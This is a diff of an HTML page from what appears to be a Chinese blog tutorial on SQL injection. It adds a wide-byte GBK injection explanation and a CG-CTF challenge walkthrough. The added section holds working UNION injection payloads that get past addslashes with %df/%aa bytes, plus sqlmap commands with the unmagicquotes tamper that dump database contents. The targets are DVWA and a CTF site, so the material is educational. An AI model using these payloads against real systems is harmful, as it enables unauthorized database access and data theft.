@@ -524,14 +524,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    10.6k
+                    11.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    45 分
+                    49 分
                 </div>
                 
 				
@@ -585,6 +585,7 @@
 <li>多语句查询注入 （Stacted queries SQL injection）</li>
 </ul>
 <h2 id="三、初试SQL注入"><a href="#三、初试SQL注入" class="headerlink" title="三、初试SQL注入"></a>三、初试SQL注入</h2><h3 id="1-手工注入常规思路"><a href="#1-手工注入常规思路" class="headerlink" title="1 手工注入常规思路"></a>1 手工注入常规思路</h3><p><strong>1.判断是否存在注入，注入是字符型还是数字型</strong><br>2.猜解 SQL 查询语句中的字段数<br>3.确定显示的字段顺序<br>4.获取当前数据库<br>5.获取数据库中的表<br>6.获取表中的字段名<br>7.显示字段信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200608143317.png" alt="手工注入流程"></p>
 <h3 id="2-实现完整手工注入"><a href="#2-实现完整手工注入" class="headerlink" title="2 实现完整手工注入"></a>2 实现完整手工注入</h3><p><strong>靶机：DVWA</strong></p>
 <p>将DVWA的级别设置为low，可以看到源码中是一句简单的查询语句，没有进行任何过过滤</p>
 <pre class="line-numbers language-sql"><code class="language-sql">$query  <span class="token operator">=</span> "<span class="token keyword">SELECT</span> first_name<span class="token punctuation">,</span> last_name <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id <span class="token operator">=</span> <span class="token string">'$id'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -612,7 +613,7 @@
 <p><img src="../images/%E6%B5%85%E8%B0%88SQL%E6%B3%A8%E5%85%A5/5d2157a14b88a69607.png" alt><br>说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</p>
 <h4 id="3-确定显示的字段顺序"><a href="#3-确定显示的字段顺序" class="headerlink" title="3.确定显示的字段顺序"></a>3.确定显示的字段顺序</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token comment" spellcheck="true">#    </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/07/07/5d2157a15b62731652.png" alt><br>说明执行的SQL语句为select First name,Surname from xx where ID=’id’</p>
-<p><strong>理解select 1,2</strong>：例如一个网站的参数传递执行的查询有3个字段，很可能这些字段不是都显示在网页前端的，假如其中的1或2个字段的查询结果是会返回到前端的，那么我们就需要知道这3个字段中哪两个结果会回显，这个过程相当于找到数据库与前端显示的通道。如果我们直接输入查询字段进行查询，语句会非常冗长，而且很可能还需要做很多次测试，这时候我们利用一个简单的select 1,2,3，根据显示在页面上的数字就可以知道哪个数字是这个“通道”，那么我们只需要把这个数字改成我们想查询的内容（如id,password），当数据爆破成功后，就会在窗口显示我们想要的结：果。</p>
+<p><strong>理解select 1,2</strong>：例如一个网站的参数传递执行的查询有3个字段，很可能这些字段不是都显示在网页前端的，假如其中的1或2个字段的查询结果是会返回到前端的，那么我们就需要知道这3个字段中哪两个结果会回显，这个过程相当于找到数据库与前端显示的通道。如果我们直接输入查询字段进行查询，语句会非常冗长，而且很可能还需要做很多次测试，这时候我们利用一个简单的select 1,2,3，根据显示在页面上的数字就可以知道哪个数字是这个“通道”，那么我们只需要把这个数字改成我们想查询的内容（如id,password），当数据爆破成功后，就会在窗口显示我们想要的结果。<a href="https://blog.csdn.net/weixin_44840696/article/details/89166154" target="_blank" rel="noopener">SELECT 1,2,3…的含义及其在SQL注入中的用法</a></p>
 <h4 id="4-获取当前数据库"><a href="#4-获取当前数据库" class="headerlink" title="4.获取当前数据库"></a>4.获取当前数据库</h4><p>上步知道字段显示顺序，那我们在字段2的位置上显示数据库试试</p>
 <pre class="line-numbers language-sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://i.loli.net/2019/07/07/5d215880225ab67916.png" alt><br>说明当前的数据库为dvwa。</p>
@@ -1092,15 +1093,11 @@ database_len<span class="token punctuation">(</span><span class="token punctuati
 
 database_name<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>获取表名、字段名、字段信息等数据的脚本类似上面布尔盲注脚本，就不赘述了</strong></p>
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>待更。。。</p>
-<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>待更。。。</p>
-<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>待更。。。</p>
-<h2 id="Cookie-注入"><a href="#Cookie-注入" class="headerlink" title="Cookie 注入"></a>Cookie 注入</h2><p>待更。。。</p>
-<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><blockquote>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote>
 <p>宽字节注入是利用mysql的一个特性，<code>mysql在使用GBK编码的时候，会认为两个字符是一个汉字</code>【前一个ascii码要大于<code>128</code>，才到汉字的范围】</p>
 </blockquote>
 <p>在PHP配置文件中<code>magic_quotes_gpc=On</code>或者使用<code>addslashes</code>函数，<code>icov</code>函数,<code>mysql_real_escape_string</code>函数、<code>mysql_escape_string</code>函数等，提交的参数中如果带有单引号<code>&#39;</code>，就会被自动转义<code>\&#39;</code>，这样就使得多数注入攻击无效。</p>
-<p>当输入单引号，假设这里我们使用<code>addslashes</code>转义，对应的url编码是：<br><strong><code>&#39;</code> –&gt;<code>\&#39;</code>–&gt; <code>%5c%27</code></strong><br>当在前面引入一个ASCII大于128的字符【比如%df】，url编码变为：<br><strong><code>%df&#39;</code> –&gt; <code>%df\&#39;</code> –&gt; <code>(%df%5C)%27</code>–&gt;<code>(数据库GBK)</code>–&gt;<code>運&#39;</code></strong></p>
+<p>当输入单引号，假设这里我们使用<code>addslashes</code>转义，对应的url编码是：<br><strong><code>&#39;</code> –&gt;<code>\&#39;</code>–&gt; <code>%5c%27</code></strong><br>当在前面引入一个ASCII大于128的字符【比如%df、%aa】，url编码变为：<br><strong><code>%df&#39;</code> –&gt; <code>%df\&#39;</code> –&gt; <code>(%df%5C)%27</code>–&gt;<code>(数据库GBK)</code>–&gt;<code>運&#39;</code></strong></p>
 <table>
 <thead>
 <tr>
@@ -1114,7 +1111,143 @@ database_name<span class="token punctuation">(</span><span class="token punctuat
 </tr>
 </tbody></table>
 <p>前端输入<strong><code>%df&#39;</code></strong>时首先经过上面<strong><code>addslashes</code></strong>函数和浏览器<strong><code>url编码</code></strong>转义变成了<strong><code>%df%5c%27</code></strong></p>
-<p>因为数据库使用<code>GBK</code>编码的话，<strong>%df%5C会被当作一个汉字处理,转换成了汉字”運”</strong>，从而使<code>%27</code>（单引号）逃出生天，成功绕过,利用这个特性从而可实施SQL注入的利用。</p>
+<p>因为数据库使用<code>GBK</code>编码的话，<strong>%df%5c会被当作一个汉字处理,转换成了汉字”運”</strong>，从而使<code>%27</code>（单引号）逃出生天，成功绕过,利用这个特性从而可实施SQL注入的利用。</p>
+<p><a href="http://www.jsons.cn/gbkcode" target="_blank" rel="noopener">在线GBK汉字编码字符集对照表</a></p>
+<h3 id="CG-CTF—GBK-Injection"><a href="#CG-CTF—GBK-Injection" class="headerlink" title="CG-CTF—GBK Injection"></a>CG-CTF—GBK Injection</h3><h4 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h4><p>题目地址：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p>
+<pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>
+<span class="token string">''</span><span class="token string">'
+your sql:select id,title from news where id = '</span><span class="token number">1</span><span class="token string">'
+here is the information
+'</span><span class="token string">''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>输入<code>1&#39;</code>可以看到<code>&#39;</code>被变成了<code>\&#39;</code>,应该是<code>addslashes</code>之类的函数转义的结果。</p>
+<pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'
+'</span><span class="token string">''</span>
+your sql:<span class="token keyword">select</span> id<span class="token punctuation">,</span>title <span class="token keyword">from</span> news <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token string">'1\''</span>
+here <span class="token operator">is</span> the information    
+<span class="token string">''</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>用上文宽字节构造方法，构造id=1%df’或者id=1%aa’，成功报错</p>
+<pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">df</span><span class="token string">'
+或者【只要ASCII大于128的字符就可以】
+?id=1%aa'</span>
+‘’‘
+your sql:<span class="token keyword">select</span> id<span class="token punctuation">,</span>title <span class="token keyword">from</span> news <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token string">'1ß\''</span>
+Warning: mysql_fetch_array<span class="token punctuation">(</span><span class="token punctuation">)</span> expects parameter <span class="token number">1</span> <span class="token keyword">to</span> <span class="token number">be</span> resource<span class="token punctuation">,</span> <span class="token keyword">boolean</span> given <span class="token operator">in</span> SQL<span class="token operator">-</span>GBK<span class="token operator">/</span><span class="token keyword">index</span><span class="token punctuation">.</span>php <span class="token keyword">on</span> line <span class="token number">10</span>
+’‘’<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>确定字段数</strong></p>
+<pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">aa</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span> <span class="token comment" spellcheck="true">--+    正常</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">aa</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span> <span class="token comment" spellcheck="true">--+    正常</span>
+?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">aa</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span> <span class="token comment" spellcheck="true">--+    报错</span>
+’‘’
+所以字段数为<span class="token number">2</span>
+‘’‘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>确定显示位</strong></p>
+<p>前面必须为-1【前面查出来的值为null，才能显示后面我们想要的信息】，后面的信息才能显示出来</p>
+<pre class="line-numbers language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">aa</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span>  <span class="token comment" spellcheck="true">--+</span>
+<span class="token string">''</span><span class="token string">'
+your sql:select id,title from news where id = '</span><span class="token operator">-</span><span class="token number">1</span>歿'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token comment" spellcheck="true">-- '</span>
+<span class="token number">2</span>
+<span class="token string">''</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>确定了回显的位置是2</p>
+<p><strong>查询信息</strong></p>
+<pre class="line-numbers language-objectivec"><code class="language-objectivec">#查询数据库
+<span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>aa' <span class="token keyword">union</span> select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token operator">--</span><span class="token operator">+</span>
+<span class="token string">''</span>'
+sae<span class="token operator">-</span>chinalover
+<span class="token string">''</span>'
+
+#查询表名
+<span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>aa' <span class="token keyword">union</span> select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema<span class="token punctuation">.</span>tables where table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">+</span>
+<span class="token string">''</span>'
+ctf<span class="token punctuation">,</span>ctf2<span class="token punctuation">,</span>ctf3<span class="token punctuation">,</span>ctf4<span class="token punctuation">,</span>news
+<span class="token string">''</span>'  
+
+#查询字段名
+<span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>aa' <span class="token keyword">union</span> select <span class="token number">1</span><span class="token punctuation">,</span> <span class="token function">group_concat</span><span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema<span class="token punctuation">.</span>columns where table_name<span class="token operator">=</span><span class="token number">0x63746634</span> <span class="token operator">--</span><span class="token operator">+</span>
+
+<span class="token string">''</span>'这里表名table_name的值必须转换成<span class="token number">16</span>进制，如果不用<span class="token number">16</span>进制就得用引号包裹，当有addlashes函数就会转义引号，就会导致查询失败，使用<span class="token number">16</span>进制避免了这个问题。
+id<span class="token punctuation">,</span>flag
+<span class="token string">''</span>'
+#查询字段信息
+<span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>aa' <span class="token keyword">union</span> select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span> from ctf4 <span class="token operator">--</span><span class="token operator">+</span>
+<span class="token string">''</span>'
+<span class="token number">1</span><span class="token punctuation">:</span>flag<span class="token punctuation">{</span>this_is_sqli_flag<span class="token punctuation">}</span>
+<span class="token string">''</span>'
+
+<span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>aa' <span class="token keyword">union</span> select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span> from ctf2 <span class="token operator">--</span><span class="token operator">+</span>     
+<span class="token string">''</span>'
+h4cked_By_w00dPeck3r<span class="token punctuation">,</span>h4cked_By_w00dPeck3r<span class="token punctuation">,</span>h4cked_By_w00dPeck3r<span class="token punctuation">,</span>h4cked_By_w00dPeck3r<span class="token punctuation">,</span>the flag is<span class="token punctuation">:</span>nctf<span class="token punctuation">{</span>query_in_mysql<span class="token punctuation">}</span><span class="token punctuation">,</span>h4cked_By_w00dPeck3r    
+<span class="token string">''</span>'    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>有2个flag，成功得到flag</p>
+<h4 id="使用sqlmap"><a href="#使用sqlmap" class="headerlink" title="使用sqlmap"></a><strong>使用sqlmap</strong></h4><p><strong>方法一：</strong>普通方法,根据提示选择选项</p>
+<pre class="line-numbers language-sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'"</span>
+
+sqlmap <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'" --dbs</span>
+
+sqlmap <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'" -D sae-chinalover  --tables</span>
+
+sqlmap <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'" -D sae-chinalover  -T --columns</span>
+
+sqlmap <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'" -D sae-chinalover -T ctf4 -C flag --dump</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>方法二：</strong>使用脚本：<code>unmagicquotes.py</code>【作用：宽字符绕过】</p>
+<pre class="line-numbers language-sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//chinalover.sinaapp.com/SQL-GBK/index.php?id=1" --tamper unmagicquotes --dbs</span>
+<span class="token string">''</span><span class="token string">'
+available databases [2]:                                                                       [*] information_schema
+[*] sae-chinalover
+'</span><span class="token string">''</span>
+
+sqlmap <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//chinalover.sinaapp.com/SQL-GBK/index.php?id=1" --tamper unmagicquotes -D sae-chinalover --tables</span>
+<span class="token string">''</span>'
+<span class="token keyword">Database</span>: sae<span class="token operator">-</span>chinalover
+<span class="token punctuation">[</span><span class="token number">6</span> <span class="token keyword">tables</span><span class="token punctuation">]</span>
+<span class="token operator">+</span><span class="token comment" spellcheck="true">---------+</span>
+<span class="token operator">|</span> ctf     <span class="token operator">|</span>
+<span class="token operator">|</span> ctf2    <span class="token operator">|</span>
+<span class="token operator">|</span> ctf3    <span class="token operator">|</span>
+<span class="token operator">|</span> ctf4    <span class="token operator">|</span>
+<span class="token operator">|</span> gbksqli <span class="token operator">|</span>
+<span class="token operator">|</span> news    <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment" spellcheck="true">---------+</span>
+<span class="token string">''</span>'
+
+sqlmap <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//chinalover.sinaapp.com/SQL-GBK/index.php?id=3" --tamper unmagicquotes -D sae-chinalover -T ctf4 --columns</span>
+<span class="token string">''</span>'
+<span class="token keyword">Database</span>: sae<span class="token operator">-</span>chinalover                                                                                                   
+<span class="token keyword">Table</span>: ctf4
+<span class="token punctuation">[</span><span class="token number">2</span> <span class="token keyword">columns</span><span class="token punctuation">]</span>
+<span class="token operator">+</span><span class="token comment" spellcheck="true">--------+--------------+</span>
+<span class="token operator">|</span> <span class="token keyword">Column</span> <span class="token operator">|</span> <span class="token keyword">Type</span>         <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment" spellcheck="true">--------+--------------+</span>
+<span class="token operator">|</span> flag   <span class="token operator">|</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">|</span>
+<span class="token operator">|</span> id     <span class="token operator">|</span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>      <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment" spellcheck="true">--------+--------------+</span>
+<span class="token string">''</span>'
+
+sqlmap <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//chinalover.sinaapp.com/SQL-GBK/index.php?id=3" --tamper unmagicquotes -D sae-chinalover -T ctf4 -C flag --dump</span>
+<span class="token string">''</span>'
+<span class="token keyword">Database</span>: sae<span class="token operator">-</span>chinalover
+<span class="token keyword">Table</span>: ctf4
+<span class="token punctuation">[</span><span class="token number">1</span> entry<span class="token punctuation">]</span>
+<span class="token operator">+</span><span class="token comment" spellcheck="true">-------------------------+</span>
+<span class="token operator">|</span> flag                    <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment" spellcheck="true">-------------------------+</span>
+<span class="token operator">|</span> flag{this_is_sqli_flag} <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment" spellcheck="true">-------------------------+</span>
+<span class="token string">''</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>方法三</strong>：直接查询flag字段</p>
+<pre class="line-numbers language-sql"><code class="language-sql">sqlmap <span class="token operator">-</span>u "http:<span class="token comment" spellcheck="true">//chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27" --search -C flag</span>
+<span class="token comment" spellcheck="true">--level 3 --risk 1 --thread 10</span>
+<span class="token string">''</span>'
+<span class="token comment" spellcheck="true">--threads 10 //如果你玩过 msfconsole的话会对这个很熟悉 sqlmap线程最高设置为10</span>
+<span class="token comment" spellcheck="true">--level 3 //sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高可到5</span>
+<span class="token comment" spellcheck="true">--risk 3 // 执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全</span>
+<span class="token comment" spellcheck="true">--search //后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D） 如果你脑子够聪明，应该知道库列表名中可能会有ctf,flag等字样</span>
+<span class="token string">''</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>待更。。。</p>
+<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>待更。。。</p>
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>待更。。。</p>
+<h2 id="Cookie-注入"><a href="#Cookie-注入" class="headerlink" title="Cookie 注入"></a>Cookie 注入</h2><p>待更。。。</p>
 <h2 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h2><p>待更。。。</p>
 <h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><h4 id="读取文件函数"><a href="#读取文件函数" class="headerlink" title="读取文件函数"></a>读取文件函数</h4><p><code>load_file（file_name）</code>：读取文件并返回该文件内容作为一个字符串。</p>
 <p><strong>使用前提：</strong></p>
@@ -2223,7 +2356,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">146.1k</span>&nbsp;字
+                class="white-color">150.6k</span>&nbsp;字
             
             
             
